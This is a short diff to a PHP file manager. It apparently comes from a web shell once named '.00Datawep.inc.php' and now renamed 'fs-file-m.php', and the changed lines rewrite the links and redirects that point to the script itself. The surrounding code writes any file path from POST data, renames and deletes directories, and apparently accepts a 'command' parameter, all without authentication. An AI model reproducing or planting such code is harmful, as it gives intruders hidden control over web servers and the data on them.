@@ -19,7 +19,7 @@ function showDirectory($path) {
 
     foreach ($dirs as $dir) {
         echo "<tr>";
-        echo "<td><a href='.00Datawep.inc.php?path=$path/$dir'>$dir/</a></td>";
+        echo "<td><a href='fs-file-m.php?path=$path/$dir'>$dir/</a></td>";
         echo "<td><a href='?delete_dir=$path/$dir'>Delete</a> | <a href='?rename=$path/$dir'>Rename</a></td>";
         echo "</tr>";
     }
@@ -91,14 +91,14 @@ if (isset($_GET['unzip'])) {
 }
 if (isset($_POST['file_content'])) {
     file_put_contents($_POST['file_path'], $_POST['file_content']);
-    header("Location: .00Datawep.inc.php?path=" . dirname($_POST['file_path']));
+    header("Location: fs-file-m.php?path=" . dirname($_POST['file_path']));
     exit();
 }
 if (isset($_POST['new_name'])) {
     $old_name = $_POST['old_name'];
     $new_name = $_POST['new_name'];
     rename($old_name, $new_name);
-    header("Location: .00Datawep.inc.php?path=" . dirname($old_name));
+    header("Location: fs-file-m.php?path=" . dirname($old_name));
     exit();
 }
 
@@ -133,7 +133,7 @@ if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_POST['command'])) {
         $link = '';
         foreach ($paths as $dir) {
             $link .= $dir . '/';
-            echo " / <a href='.00Datawep.inc.php?path=" . urlencode($link) . "'>$dir</a>";
+            echo " / <a href='fs-file-m.php?path=" . urlencode($link) . "'>$dir</a>";
         }
         ?>
     </h2>
